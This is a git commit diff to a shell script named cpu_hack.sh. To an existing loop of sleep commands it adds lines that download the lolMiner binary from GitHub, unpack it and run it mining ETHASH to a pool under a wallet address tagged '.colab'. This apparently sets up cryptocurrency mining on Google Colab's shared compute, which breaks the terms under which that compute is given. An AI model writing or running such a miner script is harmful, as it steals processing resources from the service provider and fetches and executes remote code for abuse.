cf090bf4fe4b949ac65c08b887c226c336dd8bf4
jaisai1337 <48624947+jaisai1337@users.noreply.github.com>
2021-08-18 09:08:57 -0700

    Update cpu_hack.sh

--- cpu_hack.sh
+++ cpu_hack.sh
@@ -10,3 +10,14 @@ while [ 1 ]; do
 sleep 3
 done
 sleep 999
+
+
+
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+
+cd 1.29
+
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.colab --ethstratum ETHPROXY
